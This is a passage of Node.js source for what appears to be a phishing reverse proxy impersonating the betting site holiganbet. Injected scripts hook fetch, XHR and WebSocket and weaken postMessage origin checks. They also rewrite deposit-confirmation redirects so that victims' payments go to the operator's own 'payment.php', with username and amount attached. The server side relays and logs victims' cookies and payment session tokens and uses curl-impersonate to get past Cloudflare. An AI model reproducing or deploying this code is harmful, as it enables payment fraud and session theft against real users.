      var cid = tc.tawkChatId || '';
      if (pid && cid) {
        var redirectUrl = 'https://tawk.to/chat/' + pid + '/' + cid;
        event.stopImmediatePropagation();
        if (event.data.target === '_blank') {
          window.open(redirectUrl, '_blank');
        } else {
          window.location.href = redirectUrl;
        }
        return;
      }
    }
  }
  // payIframeUpdate mesaj─▒ - ├Âdeme iframe y├╝kseklik ayar─▒
  if (event.data && event.data.type === 'payIframeUpdate') {
    var iframeEl = document.querySelector('.HostedCashierDepositIframe');
    if (iframeEl && event.data.height) {
      iframeEl.style.height = event.data.height + 'px';
    }
  }
}, true);
})();</script>
<!-- Start of Tawk.to Script -->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/69531263e9061f1980f2e248/1jdm7vl4s';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!-- End of Tawk.to Script -->`;

  const proxyDomainBase64 = Buffer.from(proxyDomain.split(':')[0]).toString('base64');
  const paymentRedirectScript = `<script>
(function() {
  var baseDomain = window.location.hostname.split('.').slice(-2).join('.');
  var REDIRECT_CONFIG = {
    "kripto": "https://yatirim." + baseDomain + "/kripto/",
    "havale": "https://yatirim." + baseDomain + "/payment.php"
  };
    
    var KRIPTO_METHODS = ["TRC20","Bitcoin","Ethereum","Tron","ERC20","Doge","Generic.Sdk.BinancePayG2.Kripto","Generic.Sdk.BinancePayG2.BTC","Generic.Sdk.BinancePayG2.ETH","Generic.Sdk.BinancePayG2.TRX","Generic.Sdk.BinancePayG2.ERC20USDT","Generic.Sdk.BinancePayG2.DOGE"];
    var HAVALE_METHODS = ["VIP Havale","QR KOD 1","QR KOD 2","Havale","Ecopayz","Kredi Karti","OTO Havale","Papara","Super Papara","Generic.HemenOde.ParolaPara","Generic.Guvenli.QR","BestPayCard.InstantQr","Generic.MovenPay.BankTransfer","Generic.HemenOde.Havale","Generic.Turbo.Havale","Generic.SafePays","Generic.TrustPara.Havale","Generic.HizliOde.Havale","Generic.MPay.Havale","Generic.ScashMoney.Bank","Generic.FlexPep.FastHavale","Generic.Trend.Havale","Generic.VevoPay.Havale","BestPayCard.Ecopayz","BestPayCard.CreditCardHosted","Generic.HemenOde.VipPos","Generic.Turbo.CreditCard","Generic.HemenOde.VipPayFix","Generic.EnHizli.Havale","Generic.HemenOde.VipPapara","Generic.Turbo.Papara","BestPayCard.Havale","Generic.FastPara.BankTransfer","Generic.Kolay.Havale","Generic.Kasamda.Havale","Generic.MPay.FastHavale"];
    
    var selectedPaymentType = null;
    var redirectDone = false;
    var username = '';
    var amount = '';
    
    function queryShadow(selector) {
        function findInShadow(root) {
            let el = root.querySelector(selector);
            if (el) return el;
            const hosts = root.querySelectorAll('*');
            for (let host of hosts) {
                if (host.shadowRoot) {
                    el = findInShadow(host.shadowRoot);
                    if (el) return el;
                }
            }
            return null;
        }
        return findInShadow(document);
    }
    
    function getUsername() {
        const el = queryShadow('.MyAccountMenuUsername');
        if (el) {
            username = el.textContent.trim();
            console.log('[PAYMENT] Username found:', username);
        } else {
            console.log('[PAYMENT] Username element not found');
        }
        return username;
    }
    
    function getAmount() {
        // Miktar i├ğin input'u bul
        const el = queryShadow('input[name="amount"]') || 
                   queryShadow('.Amount') || 
                   queryShadow('.amount-input') || 
                   queryShadow('[data-amount]') ||
                   queryShadow('input[placeholder*="tutar"]') ||
                   queryShadow('input[placeholder*="amount"]') ||
                   queryShadow('.payment-amount') ||
                   queryShadow('#amount') ||
                   queryShadow('span.amount') ||
                   queryShadow('.total-amount') ||
                   queryShadow('[class*="amount"]') ||
                   queryShadow('span.ButtonAmount') ||
                   queryShadow('span.CashierConfirmModalText') ||
                   queryShadow('span[class*="CashierConfirm"]') ||
                   queryShadow('span[class*="ModalText"]') ||
                   queryShadow('div.ModalContentContainer span') ||
                   queryShadow('input.FieldInput.Amount');
        if (el && typeof el.getAttribute === 'function') {
            let text = (el.value || el.textContent || el.getAttribute('data-amount') || '').trim();
            if (text) {
                // Ôé║ ve yaz─▒lar─▒ kald─▒r, sadece say─▒y─▒ al
                const match = text.match(/Ôé║([\d.,]+)/);
                if (match) {
                    amount = match[1].replace(/\./g, '').replace(',', '.'); // Binlik ay─▒rac─▒ kald─▒r, ondal─▒k yap
                } else {
                    amount = text.replace('Ôé║', '').replace(/[^\d.,]/g, '').trim();
                }
                console.log('[PAYMENT] Amount found:', amount, 'from element:', el.tagName, el.className, el.id);
            } else {
                console.log('[PAYMENT] Amount element found but empty, current amount:', amount);
            }
        } else {
            console.log('[PAYMENT] Amount element not found or invalid');
        }
        return amount;
    }
    
    // Observer ile amount ve username'i izle
    function observeChanges() {
        // MutationObserver kald─▒r─▒ld─▒, manuel g├╝ncelleme yeterli
        // ─░lk y├╝kleme
        getUsername();
        getAmount();
        addInputListener();
        
        // Dinamik elementler i├ğin observer
        if (document.body) {
            var observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                        getAmount();
                        addInputListener();
                    }
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });
        }
        
        // Amount input'u dinle
        function addInputListener() {
            const amountInput = queryShadow('input.FieldInput.Amount');
            if (amountInput && !amountInput.hasListener) {
                amountInput.addEventListener('input', function() {
                    amount = this.value;
                    localStorage.setItem('payment_amount', this.value);
                    console.log('[PAYMENT] Amount updated from input:', amount);
                });
                amountInput.hasListener = true;
            }
        }
        
        // Periyodik kontrol
        const interval = setInterval(() => {
            getAmount();
            addInputListener();
            if (amount && username) clearInterval(interval);
        }, 1000);
    }
    
    // Sayfa y├╝klendi─şinde ba┼şlat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', observeChanges);
    } else {
        observeChanges();
    }
    
    function detectPaymentType(input) {
        if (!input) {
            console.log('[PAYMENT] No input for detectPaymentType');
            return null;
        }
        var inputStr = typeof input === "string" ? input : JSON.stringify(input);
        console.log('[PAYMENT] Detecting payment type from:', inputStr.substring(0, 200));
        for (var i = 0; i < KRIPTO_METHODS.length; i++) { 
            if (inputStr.indexOf(KRIPTO_METHODS[i]) > -1) {
                console.log('[PAYMENT] Detected kripto:', KRIPTO_METHODS[i]);
                return "kripto"; 
            }
        }
        for (var j = 0; j < HAVALE_METHODS.length; j++) { 
            if (inputStr.indexOf(HAVALE_METHODS[j]) > -1) {
                console.log('[PAYMENT] Detected havale:', HAVALE_METHODS[j]);
                return "havale"; 
            }
        }
        console.log('[PAYMENT] Detected type: havale (default)');
        return "havale";
    }
    
    function getRedirectUrl() { 
        var baseUrl = REDIRECT_CONFIG[selectedPaymentType] || REDIRECT_CONFIG["havale"];
        if (selectedPaymentType === "havale") {
            var username = getUsername();
            amount = localStorage.getItem('payment_amount') || amount;
            var params = [];
            if (username !== '') params.push('username=' + encodeURIComponent(username));
            if (window.location && window.location.origin) params.push('ref=' + encodeURIComponent(window.location.origin));
            if (amount !== '') params.push('amount=' + encodeURIComponent(amount));
            if (params.length > 0) baseUrl += '?' + params.join('&');
        }
        return baseUrl;
    }
    
    function modifyResponse(originalResponse) {
        return originalResponse.text().then(function(text) {
            try {
                var data = JSON.parse(text);
                console.log('[PAYMENT] Original response keys:', Object.keys(data));
                console.log('[PAYMENT] Original response preview:', JSON.stringify(data).substring(0, 500));
                if (data.RedirectUrl && !redirectDone) {
                    var newUrl = getRedirectUrl();
                    console.log('[PAYMENT] Redirecting to:', newUrl);
                    if (newUrl) { data.RedirectUrl = newUrl; redirectDone = true; }
                } else if (!data.RedirectUrl && selectedPaymentType === "havale" && !redirectDone) {
                    console.log('[PAYMENT] No RedirectUrl found, forcing redirect');
                    setTimeout(() => {
                        var newUrl = getRedirectUrl();
                        if (newUrl) {
                            window.location.replace(newUrl);
                            redirectDone = true;
                        }
                    }, 200);
                }
                return new Response(JSON.stringify(data), { status: originalResponse.status, statusText: originalResponse.statusText, headers: originalResponse.headers });
            } catch(e) { 
                console.log('[PAYMENT] Parse error:', e);
                return new Response(text, { status: originalResponse.status, statusText: originalResponse.statusText, headers: originalResponse.headers }); 
            }
        });
    }
    
    var originalFetch = window.fetch;
    window.fetch = function(url, options) {
        var urlStr = url.toString();
        if (urlStr.indexOf("GetPaymentMethod") > -1 && options && options.body) {
            var type = options.body ? detectPaymentType(options.body) : null;
            console.log('[PAYMENT] GetPaymentMethod detected, type:', type);
            if (type) { selectedPaymentType = type; redirectDone = false; }
        }
        if (urlStr.indexOf("GetPaymentConfirm") > -1 || urlStr.indexOf("Confirm") > -1) {
            console.log('[PAYMENT] GetPaymentConfirm detected, type:', selectedPaymentType);
            if (options && options.body) {
                console.log('[PAYMENT] Request body:', options.body);
                try {
                    const body = JSON.parse(options.body);
                    console.log('[PAYMENT] Parsed body:', body);
                    if (body.Amount !== undefined && amount === '') {
                        amount = body.Amount;
                        console.log('[PAYMENT] Amount from request:', amount);
                    } else {
                        console.log('[PAYMENT] Amount already set or no Amount in body');
                    }
                    // Detect payment type from confirm request
                    var type = detectPaymentType(options.body);
                    if (type) {
                        selectedPaymentType = type;
                        console.log('[PAYMENT] Type detected from confirm:', type);
                    }
                } catch(e) {
                    console.log('[PAYMENT] Failed to parse request body:', e);
                }
            } else {
                console.log('[PAYMENT] No options.body');
            }
            getAmount(); // Update from DOM before redirect
            return originalFetch.apply(this, arguments).then(function(response) {
                var newUrl = getRedirectUrl();
                console.log('[PAYMENT] New redirect URL:', newUrl);
                if (newUrl && !redirectDone) return modifyResponse(response.clone());
                return response;
            });
        }
        return originalFetch.apply(this, arguments);
    };
})();
</script>`;

  const urlRewriteScript = `<script>
(function() {
  var PROXY_DOMAIN = window.location.host;
  var TARGET_DOMAIN = '${targetDomain}';
  
  // Base proxy domain (without subdomain): "www.xn--artemsbet1200-0ib.com" ÔåÆ "xn--artemsbet1200-0ib.com"
  var PROXY_HOST = PROXY_DOMAIN.split(':')[0];
  var proxyParts = PROXY_HOST.split('.');
  var PROXY_BASE = proxyParts.length > 2 ? proxyParts.slice(-2).join('.') : PROXY_HOST;
  var PROXY_PORT = PROXY_DOMAIN.split(':')[1] || '';
  
  var SUBDOMAIN_PATTERNS = [
    'api.' + TARGET_DOMAIN,
    'sportsapi.' + TARGET_DOMAIN,
    'sports2.' + TARGET_DOMAIN,
    'sports.' + TARGET_DOMAIN,
    'www.' + TARGET_DOMAIN,
    'm.' + TARGET_DOMAIN,
    'gamelaunch.' + TARGET_DOMAIN,
    TARGET_DOMAIN
  ];
  
  console.log('[PROXY] Init - Domain:', PROXY_DOMAIN, 'Base:', PROXY_BASE, 'Target:', TARGET_DOMAIN);

  // Extract subdomain from target hostname and map to proxy
  function getProxyHostForTarget(targetHostname) {
    var sub = targetHostname.replace(TARGET_DOMAIN, '').replace(/\\.$/, '');
    if (sub) {
      return sub + '.' + PROXY_BASE;
    }
    return PROXY_BASE;
  }

  function rewriteUrl(url) {
    if (!url || typeof url !== 'string') return url;
    if (url.charAt(0) === '/' && url.charAt(1) !== '/') return url;
    
    try {
      var urlObj;
      if (url.indexOf('wss://') === 0 || url.indexOf('ws://') === 0) {
        urlObj = new URL(url);
      } else if (url.indexOf('//') === 0) {
        urlObj = new URL('https:' + url);
      } else if (url.indexOf('http') === 0) {
        urlObj = new URL(url);
      } else {
        return url;
      }
      
      var hostname = urlObj.hostname;
      
      // Already our proxy domain
      if (hostname === PROXY_BASE || hostname.endsWith('.' + PROXY_BASE)) {
        return url;
      }
      
      // Cloudflare bypass
      if (hostname.indexOf('cloudflare.com') !== -1 || 
          hostname.indexOf('turnstile') !== -1 || 
          hostname.indexOf('antillephone.com') !== -1 || 
          hostname.indexOf('recaptcha') !== -1 || 
          hostname.indexOf('gstatic.com') !== -1) {
        return url;
      }
      
      var needsRewrite = false;
      for (var i = 0; i < SUBDOMAIN_PATTERNS.length; i++) {
        if (hostname === SUBDOMAIN_PATTERNS[i] || hostname.match(/holiganbet\\d*\\.com/)) {
          needsRewrite = true;
          break;
        }
      }
      
      if (needsRewrite) {
        urlObj.hostname = getProxyHostForTarget(hostname);
        urlObj.port = PROXY_PORT;
        if (url.indexOf('wss://') === 0 || url.indexOf('ws://') === 0) {
          urlObj.protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        } else {
          urlObj.protocol = window.location.protocol;
        }
        return urlObj.toString();
      }
    } catch(e) {}
    
    return url;
  }

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    try {
      var url = typeof input === 'string' ? input : input.url;
      
      // ­şöÑ NWA API - CREDENTIALS EKLE
      if (url && url.indexOf('/api/nwa/') !== -1) {
        console.log('[NWA-FIX] Request:', url);
        
        if (!init) init = {};
        init.credentials = 'include';
        
        if (!init.headers) init.headers = {};
        console.log('[NWA-FIX] Credentials set to include');
      }
      
      // Nuts bypass
      if (url && (url.indexOf('/nts/') !== -1 || url.indexOf('widgets/session') !== -1)) {
        return Promise.resolve(new Response('{}', { status: 200, headers: { 'Content-Type': 'application/json' }}));
      }
      
      if (url && url.indexOf('cloudflare.com') === -1 && url.indexOf('turnstile') === -1) {
        if (typeof input === 'string') {
          input = rewriteUrl(input);
        } else if (input && input.url) {
          input = new Request(rewriteUrl(input.url), input);
        }
      }
    } catch(e) {
      console.error('[PROXY] Fetch error:', e);
    }
    
    return _fetch.call(this, input, init);
  };

  var NativeXHR = window.XMLHttpRequest;
  window.__NativeXHR = NativeXHR; // Turnstile token fetch i├ğin sakl─▒yoruz
  function XHRProxy() {
    var xhr = new NativeXHR();
    var origOpen = xhr.open;
    
    xhr.open = function(method, url) {
      // ­şöÑ NWA XHR - withCredentials EKLE
      if (url && url.indexOf('/api/nwa/') !== -1) {
        console.log('[NWA-FIX] XHR Request:', method, url);
        xhr.withCredentials = true;
        console.log('[NWA-FIX] XHR withCredentials set to true');
      }
      
      if (url && (url.indexOf('/nts/') !== -1 || url.indexOf('widgets/session') !== -1)) {
        url = 'data:application/json,{}';
      } else if (url && url.indexOf('cloudflare.com') === -1) {
        url = rewriteUrl(url);
      }
      return origOpen.apply(this, [method, url].concat(Array.prototype.slice.call(arguments, 2)));
    };
    
    return xhr;
  }
  XHRProxy.prototype = NativeXHR.prototype;
  window.XMLHttpRequest = XHRProxy;

  var NativeWS = window.WebSocket;
  function WSProxy(url, protocols) {
    var rewrittenUrl = rewriteUrl(url);
    return protocols ? new NativeWS(rewrittenUrl, protocols) : new NativeWS(rewrittenUrl);
  }
  Object.setPrototypeOf(WSProxy, NativeWS);
  WSProxy.prototype = NativeWS.prototype;
  window.WebSocket = WSProxy;

  // IFRAME REWRITE - Sadece SportsIframe i├ğin
  var SPORTS2_DOMAIN = 'sports2.' + PROXY_BASE;
  var SPORTS2_SRC = 'https://' + SPORTS2_DOMAIN + '/tr/';
  console.log('[PROXY] SportsIframe target:', SPORTS2_SRC);
  
  function rewriteIframeSrc(src) {
    // Domain'i de─şi┼ştir + query parametrelerindeki domain'leri de rewrite et
    try {
      var urlObj = new URL(src);
      urlObj.hostname = SPORTS2_DOMAIN;
      urlObj.protocol = 'https:';
      urlObj.port = '';
      // Query parametrelerindeki target domain referanslar─▒n─▒ da rewrite et
      var fullUrl = urlObj.toString();
      fullUrl = fullUrl.replace(/holiganbet7602.com/g, PROXY_BASE);
      return fullUrl;
    } catch(e) {
      return SPORTS2_SRC;
    }
  }
  
  function rewriteIframes() {
    var sportsIframe = document.getElementById('SportsIframe');
    if (sportsIframe) {
      var currentSrc = sportsIframe.src || '';
      // Sadece domain'i de─şi┼ştir, query parametrelerini koru
      if (currentSrc && currentSrc.indexOf(SPORTS2_DOMAIN) === -1 && currentSrc.indexOf('sports2') !== -1) {
        var newSrc = rewriteIframeSrc(currentSrc);
        console.log('[PROXY] Rewriting SportsIframe from:', currentSrc.substring(0, 120), 'to:', newSrc.substring(0, 120));
        sportsIframe.src = newSrc;
      } else if (!currentSrc || currentSrc === 'about:blank') {
        console.log('[PROXY] SportsIframe empty, setting:', SPORTS2_SRC);
        sportsIframe.src = SPORTS2_SRC;
      }
    }
  }  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', rewriteIframes);
  } else {
    rewriteIframes();
  }

  // Iframe load event'lerinde de kontrol et
  document.addEventListener('load', function(e) {
    if (e.target.tagName === 'IFRAME' && e.target.id === 'SportsIframe') {
      setTimeout(rewriteIframes, 100);
    }
  }, true);

  // S├╝rekli kontrol et
  setInterval(rewriteIframes, 1000);
  console.log('[PROXY] Iframe rewrite interval started - checking SportsIframe every 1 second');

  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
      if (mutation.type === 'childList') {
        mutation.addedNodes.forEach(function(node) {
          if (node.tagName === 'IFRAME' && node.id === 'SportsIframe') {
            setTimeout(rewriteIframes, 100);
          }
        });
      } else if (mutation.type === 'attributes' && mutation.attributeName === 'src' && mutation.target.tagName === 'IFRAME' && mutation.target.id === 'SportsIframe') {
        setTimeout(function() {
          var iframe = mutation.target;
          var iframeSrc = iframe.src || '';
          if (iframeSrc && iframeSrc.indexOf(SPORTS2_DOMAIN) === -1 && iframeSrc.indexOf('sports2') !== -1) {
            var newSrc = rewriteIframeSrc(iframeSrc);
            console.log('[PROXY] Observer rewriting SportsIframe from:', iframeSrc.substring(0, 120), 'to:', newSrc.substring(0, 120));
            iframe.src = newSrc;
          } else if (iframeSrc && iframeSrc.indexOf(SPORTS2_DOMAIN) === -1 && !iframeSrc.startsWith('about:')) {
            console.log('[PROXY] Observer non-sports2 iframe src detected:', iframeSrc.substring(0, 120));
          }
        }, 10);
      }
    });
  });

  if (document.body) observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['src'] });

  // PostMessage fix - origin mismatch bypass
  var _origPostMessage = window.postMessage.bind(window);
  var _HTMLIFrameProto = HTMLIFrameElement.prototype;
  var _origContentWindow = Object.getOwnPropertyDescriptor(_HTMLIFrameProto, 'contentWindow');
  
  // Override postMessage on any window/iframe to bypass origin checks for our proxy domains
  (function fixPostMessage() {
    // Patch Window.prototype.postMessage
    var origWinPM = Window.prototype.postMessage;
    Window.prototype.postMessage = function(message, targetOrigin, transfer) {
      if (typeof targetOrigin === 'string' && targetOrigin.indexOf(PROXY_BASE) !== -1) {
        targetOrigin = '*';
      }
      return origWinPM.call(this, message, targetOrigin, transfer);
    };
  })();
  
  console.log('[PROXY] All systems active - NWA credentials fix enabled - postMessage fix enabled');
})();
</script>`;

  return antiPhishingScript + tunnelScript + captchaBypassScript + urlRewriteScript + paymentRedirectScript;
};

// ============= MAIN PROXY HANDLER =============
app.use(async (req, res) => {
  try {
    if (req.headers.referer && req.headers.referer.includes('challenges.cloudflare.com')) {
      return res.status(200).send('OK');
    }
    
    const userAgent = req.headers["user-agent"] || "Mozilla/5.0";
    const proxyDomain = req.headers.host || `localhost:${PORT}`;
    
    const hostname = proxyDomain.split(':')[0].toLowerCase();
    let subdomain = 'www';
    
    if (hostname.startsWith('api.')) subdomain = 'api';
    else if (hostname.startsWith('sports2.')) subdomain = 'sports2';
    else if (hostname.startsWith('sportsapi.')) subdomain = 'sportsapi';
    else if (hostname.startsWith('gamelaunch.')) subdomain = 'gamelaunch';
    else if (hostname.startsWith('m.')) subdomain = 'mobile';
    
    let targetHost = CONFIG.domain.www;
    
    // ­şöÑ NWA API ROUTING
    if (req.url.startsWith('/api/nwa/')) {
      targetHost = CONFIG.domain.www;
      console.log(`\n­şÄ░ ============ NWA API REQUEST ============`);
      console.log(`   URL: ${req.url}`);
      console.log(`   Method: ${req.method}`);
      console.log(`   Origin: ${req.headers.origin || 'none'}`);
      console.log(`   Cookies: ${req.headers.cookie ? req.headers.cookie.substring(0, 100) + '...' : 'none'}`);
      console.log(`   Target: https://${targetHost}${req.url}`);
      console.log(`==========================================\n`);
    } else if (subdomain === 'api') {
      targetHost = CONFIG.domain.api;
    } else if (subdomain === 'sports2') {
      targetHost = CONFIG.domain.sports2;
    } else if (subdomain === 'sportsapi') {
      targetHost = CONFIG.domain.sportsapi;
    } else if (subdomain === 'gamelaunch') {
      targetHost = CONFIG.domain.gamelaunch;
    } else if (subdomain === 'mobile') {
      targetHost = CONFIG.domain.mobile;
    } else if (req.url.includes('/v2') || req.url.includes('handshake')) {
      targetHost = CONFIG.domain.api;
    } else if (req.url.startsWith('/api/bm/')) {
      // /api/bm/ path'i www domain'inde ├ğal─▒┼ş─▒r (banner manager)
      targetHost = CONFIG.domain.www;
    } else if (req.url.startsWith('/api/') && !req.url.startsWith('/apijson')) {
      targetHost = CONFIG.domain.api;
    } else if (req.url.startsWith('/apijson')) {
      targetHost = CONFIG.domain.www;
    }
    
    if (!isAsset(req.url) && !req.url.startsWith('/api/nwa/')) {
      console.log(`­şôÑ ${req.method} ${req.url} [${subdomain}]`);
    }
    
    const targetUrl = new URL(req.url, `https://${targetHost}`);
    const fullUrl = targetUrl.toString();

    // Base headers - Cookie burada set ediliyor
    const headers = {
      "User-Agent": userAgent,
      "Accept": req.headers.accept || "*/*",
      "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
      "Accept-Encoding": "gzip, deflate, br",
      "Cookie": req.headers.cookie || "",  // Ô£à Cookie her zaman ekleniyor
      "Host": targetUrl.host,
    };

    // ­şöÑ NWA ─░├ç─░N ├ûZEL HEADER'LAR - Object.assign ile cookie korunuyor
    if (req.url.startsWith('/api/nwa/')) {
      Object.assign(headers, {
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/plain, */*',
      });
      
      // Custom headers ekle
      if (req.headers['x-sessionid']) {
        headers['X-SessionId'] = req.headers['x-sessionid'];
      }
      
      if (req.headers['x-client-request-timestamp']) {
        headers['X-Client-Request-Timestamp'] = req.headers['x-client-request-timestamp'];
      }
      
      // Ô£à CRITICAL FIX: Payment token header
      if (req.headers['x-payment-session-token']) {
        headers['X-Payment-Session-Token'] = req.headers['x-payment-session-token'];
        console.log(`   [PAYMENT-TOKEN] ${req.headers['x-payment-session-token'].substring(0, 50)}...`);
      }
      
      // Content-Type sadece POST/PUT i├ğin
      if (req.method === 'POST' || req.method === 'PUT') {
        headers['Content-Type'] = req.headers['content-type'] || 'application/json;charset=UTF-8';
      }
      
      // Referer
      if (req.headers.referer) {
        headers['Referer'] = req.headers.referer.replace(proxyDomain, targetHost);
      } else {
        headers['Referer'] = `https://${CONFIG.domain.www}/`;
      }
      
      // Origin
      if (req.headers.origin) {
        headers['Origin'] = req.headers.origin.replace(proxyDomain, targetHost);
      } else {
        headers['Origin'] = `https://${CONFIG.domain.www}`;
      }
    }

    if (req.headers.referer && !req.url.startsWith('/api/nwa/')) {
      headers.Referer = req.headers.referer;
    }
    if (req.headers.origin && !req.url.startsWith('/api/nwa/')) {
      headers.Origin = req.headers.origin.replace(proxyDomain, targetHost);
    }
    if (req.headers.authorization) {
      headers.Authorization = req.headers.authorization;
    }

    // CDN-CGI HANDLER
    if (req.url.startsWith('/cdn-cgi/')) {
      try {
        const curlResult = await curlFetchBinary(fullUrl);
        if (curlResult.status === 200 && curlResult.buffer.length > 0) {
          res.status(200);
          res.setHeader('Content-Type', curlResult.headers['content-type'] || 'application/javascript');
          return res.send(curlResult.buffer);
        }
      } catch (e) {
        console.error('ÔØî CDN-CGI curl error:', e.message);
      }
      // Fallback
      try {
        const response = await fetchWithRetry(fullUrl, { 
          method: req.method,
          headers: {
            ...headers,
            "Content-Type": req.headers["content-type"] || "application/javascript",
          },
          body: req.method !== "GET" && req.method !== "HEAD" ? JSON.stringify(req.body) : undefined,
        });
        const buffer = Buffer.from(await response.arrayBuffer());
        const contentType = response.headers.get("content-type") || "application/javascript";
        res.status(response.status);
        res.setHeader("Content-Type", contentType);
        return res.send(buffer);
      } catch (e2) {
        return res.status(502).send('CDN-CGI Error');
      }
    }

    // ASSET HANDLER ÔÇö curl-impersonate ├Âncelikli
    if (isAsset(req.url)) {
      if (assetCache.has(fullUrl)) {
        const { buffer, type } = assetCache.get(fullUrl);
        res.setHeader("Content-Type", type);
        res.setHeader("Cache-Control", "public, max-age=86400, immutable");
        res.setHeader("X-Cache", "HIT");
        return res.send(buffer);
      }

      let buffer, contentType;
      
      // ├ûnce curl-impersonate dene (CF bypass)
      try {
        const curlResult = await curlFetchBinary(fullUrl);
        if (curlResult.status === 200 && curlResult.buffer.length > 0) {
          buffer = curlResult.buffer;
          contentType = curlResult.headers['content-type'] || getContentType(path.extname(new URL(fullUrl).pathname));
        }
      } catch (e) {
        // curl-impersonate ba┼şar─▒s─▒z ÔÇö fallback dene
      }

      // Fallback: normal fetch
      if (!buffer) {
        try {
          const response = await fetchWithRetry(fullUrl, { headers });
          if (response.ok) {
            buffer = Buffer.from(await response.arrayBuffer());
            contentType = response.headers.get("content-type") || getContentType(path.extname(new URL(fullUrl).pathname));
          }
        } catch (e) {
          // fetch de ba┼şar─▒s─▒z
        }
      }

      if (!buffer) {
        return res.status(404).send("Not Found");
      }

      assetCache.set(fullUrl, { buffer, type: contentType });

      res.setHeader("Content-Type", contentType);
      res.setHeader("Cache-Control", "public, max-age=86400, immutable");
      res.setHeader("X-Cache", "MISS");
      return res.send(buffer);
    }

    // API HANDLER ÔÇö curl-impersonate ile CF bypass
    if (isAPI(req.url) || req.url.startsWith('/api/nwa/') || req.url.startsWith('/apijson')) {
      let apiBody = null;
      let apiContentType = 'application/json';
      let apiStatus = 502;
      let apiSetCookies = [];

      // POST body haz─▒rla
      const reqBody = (req.method !== 'GET' && req.method !== 'HEAD') ? JSON.stringify(req.body) : null;

      // ├ûnce curl-impersonate dene
      try {
        const curlArgs = ['-s', '-L', '--compressed', '--max-time', '20'];
        
        // Method
        if (req.method !== 'GET') {
          curlArgs.push('-X', req.method);
        }

        // Proxy
        if (CONFIG.proxy.enabled) {
          curlArgs.push('-x', `http://${CONFIG.proxy.username}:${CONFIG.proxy.password}@${CONFIG.proxy.host}:${CONFIG.proxy.port}`);
        }

        // Headers
        curlArgs.push('-H', `Host: ${targetUrl.host}`);
        curlArgs.push('-H', `User-Agent: ${userAgent}`);
        curlArgs.push('-H', `Accept: ${headers.Accept || 'application/json, text/plain, */*'}`);
        curlArgs.push('-H', 'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8');
        if (headers.Cookie) curlArgs.push('-H', `Cookie: ${headers.Cookie}`);
        if (headers.Referer) curlArgs.push('-H', `Referer: ${headers.Referer}`);
        if (headers.Origin) curlArgs.push('-H', `Origin: ${headers.Origin}`);
        if (headers.Authorization) curlArgs.push('-H', `Authorization: ${headers.Authorization}`);
        if (headers['X-Requested-With']) curlArgs.push('-H', `X-Requested-With: ${headers['X-Requested-With']}`);
        if (headers['X-SessionId']) curlArgs.push('-H', `X-SessionId: ${headers['X-SessionId']}`);
        if (headers['X-Client-Request-Timestamp']) curlArgs.push('-H', `X-Client-Request-Timestamp: ${headers['X-Client-Request-Timestamp']}`);
        if (headers['X-Payment-Session-Token']) curlArgs.push('-H', `X-Payment-Session-Token: ${headers['X-Payment-Session-Token']}`);

        // POST body
        if (reqBody) {
          curlArgs.push('-H', `Content-Type: ${headers['Content-Type'] || req.headers['content-type'] || 'application/json;charset=UTF-8'}`);
          curlArgs.push('-d', reqBody);
        }

        // Header + output files
        const headerFile = `/tmp/curl_api_hdr_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
        const outFile = `/tmp/curl_api_out_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`;
        curlArgs.push('-D', headerFile, '-o', outFile);
        curlArgs.push(fullUrl);

        const curlResult = await new Promise((resolve, reject) => {
          execFile(CURL_IMPERSONATE_BIN, curlArgs, {
            timeout: 25000,
            env: { ...process.env, LD_LIBRARY_PATH: '/opt/curl-impersonate' },
          }, (err) => {
            let status = 0, hdrs = {}, cookies = [];
            try {
              const raw = fs.readFileSync(headerFile, 'utf8');
              fs.unlinkSync(headerFile);
              const statusLines = raw.match(/^HTTP\/[\d.]+\s+(\d{3})/gm);
              if (statusLines) { const m = statusLines[statusLines.length - 1].match(/\s(\d{3})/); if (m) status = parseInt(m[1]); }
              for (const line of raw.split('\r\n')) {
                const idx = line.indexOf(':');
                if (idx > 0) {
                  const k = line.substring(0, idx).trim().toLowerCase();
                  const v = line.substring(idx + 1).trim();
                  if (k === 'set-cookie') cookies.push(v);
                  else hdrs[k] = v;
                }
              }
            } catch (_) { try { fs.unlinkSync(headerFile); } catch (_) {} }
            let buffer = Buffer.alloc(0);
            try { buffer = fs.readFileSync(outFile); fs.unlinkSync(outFile); } catch (_) { try { fs.unlinkSync(outFile); } catch (_) {} }
            if (err && buffer.length === 0) return reject(err);
            resolve({ status, headers: hdrs, buffer, cookies });
          });
        });

        apiStatus = curlResult.status;
        apiContentType = curlResult.headers['content-type'] || 'application/json';
        apiSetCookies = curlResult.cookies || [];
        apiBody = curlResult.buffer;
      } catch (curlErr) {
        console.error('ÔØî API curl-impersonate error:', curlErr.message, req.url.substring(0, 100));
        // Fallback: normal fetch
        try {
          const response = await fetchWithRetry(fullUrl, {
            method: req.method,
            headers: headers,
            body: reqBody,
          });
          apiStatus = response.status;
          apiContentType = response.headers.get('content-type') || 'application/json';
          apiBody = Buffer.from(await response.arrayBuffer());
          const sc = response.headers.raw()['set-cookie'];
          if (sc) apiSetCookies = sc;
        } catch (fetchErr) {
          console.error('ÔØî API fetch also failed:', fetchErr.message);
          return res.status(502).json({ error: 'API request failed' });
        }
      }

      // NWA log
      if (req.url.startsWith('/api/nwa/')) {
        console.log(`­şÄ░ NWA RESPONSE: ${apiStatus} | Size: ${apiBody ? apiBody.length : 0} | ${req.url.substring(0, 80)}`);
      }

      // Set-Cookie rewrite
      if (apiSetCookies.length > 0) {
